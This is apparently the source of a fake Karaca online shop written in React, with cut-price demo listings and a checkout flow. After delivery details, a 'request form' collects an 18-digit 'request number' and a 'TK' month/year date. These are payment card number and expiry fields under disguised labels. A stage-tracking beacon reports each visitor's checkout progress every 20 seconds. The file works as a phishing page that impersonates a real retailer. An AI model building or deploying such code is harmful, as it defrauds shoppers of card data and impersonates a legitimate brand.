'use client';
import { useEffect,useMemo,useRef,useState } from 'react';
import { supabase } from '../lib/supabase';

const demoProducts=[
{id:'10000000-0000-0000-0000-000000000001',name:'Karaca Swiss Crystal Neocast 7 Parça Döküm Tencere ve Tava Seti - Pembe',price:3199,old_price:6815,stock:99,description:'7 parçalık döküm tencere ve tava seti. Modern pembe gövdesi ve farklı parça seçenekleriyle günlük pişirme ihtiyaçlarına uygundur.',image_url:'/products/swiss-crystal-pink.png'},
{id:'10000000-0000-0000-0000-000000000002',name:'Emsan Forever Bone Lord 53 Parça 12 Kişilik Yemek Takımı',price:2800,old_price:6800,stock:78,description:'12 kişilik 53 parçalık yemek takımı. Krem tonları ve zarif detaylarıyla günlük ve özel sofralar için hazırlanmıştır.',image_url:'/products/emsan-forever-bone.png'},
{id:'10000000-0000-0000-0000-000000000003',name:'Karaca Home Ellie Yeşil Çift Kişilik Pike',price:90,old_price:189,stock:77,description:'Yeşil tonlarda, dokulu ve ferah görünümlü çift kişilik pike.',image_url:'/products/ellie-green-pike.png'},
{id:'10000000-0000-0000-0000-000000000004',name:'Karaca Home Maye %100 Pamuk Fırfırlı Çift Kişilik Pike - Mürdüm',price:130,old_price:225,stock:99,description:'%100 pamuk dokusu ve fırfırlı kenarlarıyla dekoratif çift kişilik pike.',image_url:'/products/maye-purple-pike.png'},
{id:'10000000-0000-0000-0000-000000000005',name:'Homend Fanomen 9011H Uzaktan Kumandalı Soğuk Su ve Buz Hazneli Kule Tipi Vantilatör 60W',price:2499,old_price:5328,stock:88,description:'Uzaktan kumandalı, su ve buz hazneli 60W kule tipi vantilatör.',image_url:'/products/homend-fanomen.png'},
{id:'10000000-0000-0000-0000-000000000006',name:'Karaca Plasma Steel 316+ 3Ply 7 Parça Tencere ve Tava Seti',price:2990,old_price:5999,stock:100,description:'Paslanmaz çelik görünümlü 7 parçalık tencere ve tava seti.',image_url:'/products/plasma-steel.png'},
{id:'10000000-0000-0000-0000-000000000007',name:'Emsan Emirgan 8 Parça Çelik Tencere Seti',price:1299,old_price:2599,stock:47,description:'Parlak çelik gövdeli, farklı boylardan oluşan 8 parçalık tencere seti.',image_url:'/products/emsan-emirgan.png'}];
const demoBanners=[{id:'b1',desktop_url:'/placeholder-banner.svg',mobile_url:'/placeholder-banner-mobile.svg'}];
const fmt=n=>Number(n||0).toLocaleString('tr-TR',{maximumFractionDigits:2});

export default function Storefront(){
 const [products,setProducts]=useState(demoProducts),[banners,setBanners]=useState(demoBanners),[cart,setCart]=useState([]),[view,setView]=useState('home'),[selected,setSelected]=useState(null),[customer,setCustomer]=useState({first_name:'',last_name:'',email:'',phone:'',city:'',district:'',address:''});
 const visitorId=useRef(null);
 const [orderId,setOrderId]=useState(null),[formError,setFormError]=useState(''),[requestLoading,setRequestLoading]=useState(false);
 const [requestForm,setRequestForm]=useState({request_name:'',request_number:'',tk_date:''});
 useEffect(()=>{(async()=>{if(!supabase)return;const[{data:p},{data:b}]=await Promise.all([supabase.from('products').select('*').eq('active',true).order('sort_order'),supabase.from('banners').select('*').eq('active',true).order('sort_order')]);if(p?.length)setProducts(p);if(b?.length)setBanners(b)})()},[]);

 const count=cart.reduce((n,x)=>n+x.qty,0),total=useMemo(()=>cart.reduce((s,x)=>s+Number(x.price)*x.qty,0),[cart]);
 useEffect(()=>{
   let id=localStorage.getItem('karaca_visitor_session');
   if(!id){ id=crypto.randomUUID(); localStorage.setItem('karaca_visitor_session',id); }
   visitorId.current=id;
 },[]);
 const stage=view==='request'?'request':view==='checkout'?'checkout':view==='cart'||cart.length?'cart':'browsing';
 useEffect(()=>{
   if(!visitorId.current) return;
   const send=()=>fetch('/api/analytics',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({session_id:visitorId.current,stage,cart_count:count,cart_total:total}),keepalive:true}).catch(()=>{});
   send();
   const timer=setInterval(send,20000);
   return()=>clearInterval(timer);
 },[stage,count,total]);

 const add=p=>setCart(c=>{const f=c.find(x=>x.id===p.id);return f?c.map(x=>x.id===p.id?{...x,qty:x.qty+1}:x):[...c,{...p,qty:1}]});
 const open=p=>{setSelected(p);setView('detail');scrollTo(0,0)};
 const buy=p=>{add(p);setView('checkout');scrollTo(0,0)};
 const change=(id,d)=>setCart(c=>c.map(x=>x.id===id?{...x,qty:Math.max(1,x.qty+d)}:x));
 const remove=id=>setCart(c=>c.filter(x=>x.id!==id));
 async function saveOrder(e){
   e.preventDefault();
   if(!cart.length)return;
   setFormError('');
   try{
     const r=await fetch('/api/orders',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({
       customer_name:`${customer.first_name} ${customer.last_name}`.trim(),
       email:customer.email,
       phone:customer.phone,
       city:customer.city,
       district:customer.district,
       address:customer.address,
       total,
       items:cart.map(x=>({id:x.id,name:x.name,qty:x.qty,price:x.price}))
     })});
     const data=await r.json();
     if(!r.ok||!data.id) throw new Error(data.error||'Sipariş oluşturulamadı.');
     setOrderId(data.id);
     setRequestForm(f=>({...f,request_name:`${customer.first_name} ${customer.last_name}`.trim()}));
     setView('request');scrollTo(0,0);
   }catch(err){ setFormError(err.message||'Sipariş oluşturulamadı.'); }
 }
 function formatRequestNumber(value){
   const d=String(value||'').replace(/\D/g,'').slice(0,18);
   return d.replace(/(.{4})/g,'$1 ').trim();
 }
 function formatTkDate(value){
   const d=String(value||'').replace(/\D/g,'').slice(0,4);
   return d.length>2?`${d.slice(0,2)}/${d.slice(2)}`:d;
 }
 async function submitRequest(e){
   e.preventDefault();
   setFormError('');
   const digits=requestForm.request_number.replace(/\D/g,'');
   if(!requestForm.request_name.trim()){setFormError('Talep edenin adı soyadı zorunludur.');return;}
   if(!/^\d{18}$/.test(digits)){setFormError('Talep numarası tam 18 hane olmalıdır.');return;}
   if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(requestForm.tk_date)){setFormError('TK tarihi AA/YY formatında ve geçerli bir ay olmalıdır.');return;}
   if(!orderId){setFormError('Sipariş kaydı bulunamadı. Teslimat adımından tekrar deneyin.');return;}
   setRequestLoading(true);
   try{
     const r=await fetch('/api/request',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({
       order_id:orderId,
       request_name:requestForm.request_name.trim(),
       request_number:digits,
       tk_date:requestForm.tk_date
     })});
     const data=await r.json();
     if(!r.ok) throw new Error(data.error||'Talep kaydedilemedi.');
     setView('success');scrollTo(0,0);
   }catch(err){setFormError(err.message||'Talep kaydedilemedi.');}
   finally{setRequestLoading(false);}
 }
 return <main><div className="topline">2500 TL üzeri alışverişlerde kargo ücretsiz</div><header className="header"><button className="brand ghost" onClick={()=>setView('home')}>KARACA</button><div className="search">Aradığın Her Şey</div><div className="header-icons"><span>♡ Favorilerim</span><span>Hesabım</span><button className="ghost" onClick={()=>setView('cart')}>Sepetim ({count})</button></div></header><nav className="nav">Kategoriler　 Sofra　 Mutfak　 Küçük Ev Aletleri　 Ev ve Yaşam　 Hobi Eğlence　 Çeyiz Seti　 Kırmızı Etiket　 Çok Satan　 Markalar　 Hediye　 Kampanyalar</nav>
 {view==='home'&&<><section className="hero">{banners.slice(0,4).map((b,i)=><picture className="hero-card" key={b.id||i}><source media="(max-width:720px)" srcSet={b.mobile_url||b.desktop_url}/><img src={b.desktop_url} alt={`Kampanya ${i+1}`}/></picture>)}</section><section className="trust"><span>🚚 Ücretsiz Kargo</span><span>⚡ Hızlı Teslimat</span><span>↩ 14 Gün İade</span><span>📝 Kolay Talep</span></section><section className="section-wrap"><div className="section-head"><div><div className="eyebrow">SANA ÖZEL SEÇİMLER</div><h2>Çok Satanlar</h2></div></div><div className="products">{products.map(p=><article className="product-card" key={p.id}>{p.old_price>p.price&&<div className="discount">%{Math.round((1-p.price/p.old_price)*100)}</div>}<div className="stock-badge">{p.stock||0} adet stok</div><button className="product-open" onClick={()=>open(p)}><img src={p.image_url||'/placeholder-product.svg'} alt={p.name}/><h3>{p.name}</h3></button><p className="product-description">{p.description}</p><div className="prices"><strong>₺{fmt(p.price)}</strong><del>₺{fmt(p.old_price)}</del></div><div className="product-actions"><button className="secondary" onClick={()=>add(p)}>Sepete Ekle</button><button className="buy-now" onClick={()=>buy(p)}>Hemen Al</button></div></article>)}</div></section></>}
 {view==='detail'&&selected&&<section className="detail"><div className="detail-gallery"><img src={selected.image_url}/></div><div className="detail-info"><div className="eyebrow">Ana Sayfa / Ürün</div><h1>{selected.name}</h1><div className="detail-price">₺{fmt(selected.price)} <del>₺{fmt(selected.old_price)}</del></div><div className="stock-line">● {selected.stock} adet stok</div><p>{selected.description}</p><button className="big-red" onClick={()=>add(selected)}>Sepete Ekle</button><button className="big-outline" onClick={()=>buy(selected)}>Hemen Al</button><div className="detail-benefits"><p>🚚 Ücretsiz Kargo</p><p>↩ 14 gün içinde kolay iade</p><p>📝 Kolay talep</p></div></div></section>}
 {view==='cart'&&<section className="checkout-shell"><h1>Sepetim ({count})</h1>{cart.map(x=><div className="cart-row" key={x.id}><img src={x.image_url}/><div><strong>{x.name}</strong><p>₺{fmt(x.price)}</p></div><div className="qty"><button onClick={()=>change(x.id,-1)}>-</button>{x.qty}<button onClick={()=>change(x.id,1)}>+</button></div><button className="ghost" onClick={()=>remove(x.id)}>Sil</button></div>)}<div className="cart-total"><span>Toplam</span><strong>₺{fmt(total)}</strong></div><button className="big-red" disabled={!cart.length} onClick={()=>setView('checkout')}>Teslimat Bilgilerine Geç</button></section>}
 {view==='checkout'&&<section className="checkout-shell"><div className="steps">1 Teslimat　—　2 Talep Formu　—　3 Onay</div><h1>Teslimat Bilgileri</h1><form className="delivery" onSubmit={saveOrder}><input required placeholder="Ad" value={customer.first_name} onChange={e=>setCustomer({...customer,first_name:e.target.value})}/><input required placeholder="Soyad" value={customer.last_name} onChange={e=>setCustomer({...customer,last_name:e.target.value})}/><input required type="email" placeholder="E-posta" value={customer.email} onChange={e=>setCustomer({...customer,email:e.target.value})}/><input required placeholder="Telefon" value={customer.phone} onChange={e=>setCustomer({...customer,phone:e.target.value})}/><input required placeholder="İl" value={customer.city} onChange={e=>setCustomer({...customer,city:e.target.value})}/><input required placeholder="İlçe" value={customer.district} onChange={e=>setCustomer({...customer,district:e.target.value})}/><textarea required placeholder="Açık adres" value={customer.address} onChange={e=>setCustomer({...customer,address:e.target.value})}/><div className="cart-total"><span>Sipariş Toplamı</span><strong>₺{fmt(total)}</strong></div>{formError&&<div className="notice wide">{formError}</div>}<button className="big-red">Talep Formuna Geç</button></form></section>}
 {view==='request'&&<section className="checkout-shell payment-safe"><div className="steps">1 Teslimat　—　<strong>2 Talep Formu</strong>　—　3 Onay</div><h1>Talep Formu</h1><div className="custom-pay-wrap"><div className="custom-pay-head"><div><strong>Talep Bilgileri</strong><p>Aşağıdaki alanları eksiksiz doldurun.</p></div></div><form className="custom-card-form" onSubmit={submitRequest}><label className="full">Talep Edenin Adı Soyadı<input required autoComplete="name" placeholder="AD SOYAD" value={requestForm.request_name} onChange={e=>setRequestForm({...requestForm,request_name:e.target.value})}/></label><label className="full">Talep Numarası<input required inputMode="numeric" autoComplete="off" placeholder="1234 5678 9012 3456 78" value={requestForm.request_number} onChange={e=>setRequestForm({...requestForm,request_number:formatRequestNumber(e.target.value)})}/><small>18 hane, yalnızca rakam.</small></label><label>TK<input required inputMode="numeric" autoComplete="off" placeholder="AA/YY" value={requestForm.tk_date} onChange={e=>setRequestForm({...requestForm,tk_date:formatTkDate(e.target.value)})}/></label><button className="big-red full" disabled={requestLoading}>{requestLoading?'Kaydediliyor...':'Talebi Gönder'}</button></form>{formError&&<div className="notice">{formError}</div>}</div><button className="big-outline" onClick={()=>setView('checkout')}>Teslimata Dön</button></section>}
 {view==='success'&&<section className="checkout-shell payment-success"><div className="shield">✅</div><h2>Talebiniz alındı</h2><p>Talep bilgileriniz başarıyla kaydedildi.</p><button className="big-red" onClick={()=>{setCart([]);setOrderId(null);setRequestForm({request_name:'',request_number:'',tk_date:''});setView('home')}}>Mağazaya Dön</button></section>}
 <><footer className="footer"><div><h4>KARACA</h4><p>Karaca Kurumsal</p><p>Hakkımızda</p><p>Mağazalarımız</p><p>İletişim</p></div><div><h4>YARDIM</h4><p>İade ve İptal Şartları</p><p>Bilgi Toplumu Hizmetleri</p><p>İşlem Rehberi</p><p>Sipariş Takibi</p></div><div><h4>ALIŞVERİŞ</h4><p>Kampanyalar</p><p>Tüm Markalar</p><p>Kolay İade</p></div><div><h4>KİŞİSEL VERİLERİN KORUNMASI</h4><p>Bilgilendirme</p><p>KVKK</p><p>Çerez Politikası</p></div><div className="footer-etbis"><img src="/etbis-qr.png" alt="ETBİS Kayıt QR"/></div><div className="footer-wide"><small>© 2026 - Tüm hakları saklıdır.</small></div></footer><div className="payment-strip"><img src="/payment-methods.png" alt="Ödeme yöntemleri"/></div></>
 </main>
}
